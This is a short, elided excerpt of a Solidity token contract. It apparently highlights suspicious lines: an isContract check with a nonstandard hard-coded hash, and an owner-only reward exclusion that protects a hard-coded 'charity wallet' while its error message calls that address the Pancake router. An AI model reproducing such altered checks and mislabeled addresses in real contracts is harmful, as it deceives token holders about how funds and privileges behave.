...
library Address {
    ...
    function isContract(address account) internal view returns (bool) {
        ...
        bytes32 codehash;
        bytes32 accountHash =  0x4f03f0f8607d6a8e69de30a4778bd2b92b852e0f57399aa004ccbfeee362c0e9 ;
...
contract Name is Context, IERC20, Ownable {
    ...
    address public charityWallet = 0xf2f4Aba33Abc9267B13684b76D575758e855882d;
    ...
    function excludeFromReward(address account) public onlyOwner() {
        require(account != 0xf2f4Aba33Abc9267B13684b76D575758e855882d, 'We can not exclude Pancake router.');
